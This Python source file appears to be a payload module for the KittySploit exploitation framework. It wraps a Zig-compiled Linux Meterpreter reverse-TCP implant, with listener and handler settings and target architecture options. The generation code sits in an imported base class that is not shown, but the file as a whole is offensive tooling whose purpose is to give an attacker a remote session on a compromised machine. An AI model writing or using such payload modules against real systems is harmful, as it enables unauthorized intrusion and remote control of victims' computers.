#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from core.payload_templates.zig_meterpreter_reverse_tcp import ZigMeterpreterReverseTcpBase


class Module(ZigMeterpreterReverseTcpBase, Payload):
    __info__ = {
        'name': 'Zig Meterpreter Linux, Reverse TCP',
        'description': 'Linux Meterpreter payload in Zig (requires Zig compiler)',
        'author': 'KittySploit Team',
        'version': '1.1.0',
        'category': 'singles',
        'platform': Platform.UNIX,
        'arch': Arch.X64,
        'listener': 'listeners/multi/meterpreter_reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://ziglang.org/',
            'https://ziglang.org/documentation/master/#Cross-compilation-is-a-first-class-use-case'
        ]
    }

    target_os = OptChoice('linux', 'Target operating system', True, ['linux'])
    target_arch = OptChoice('x86_64', 'Target architecture', True,
                            ['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64'])

    def generate(self):
        return super().generate()

    def run(self):
        return self.generate()
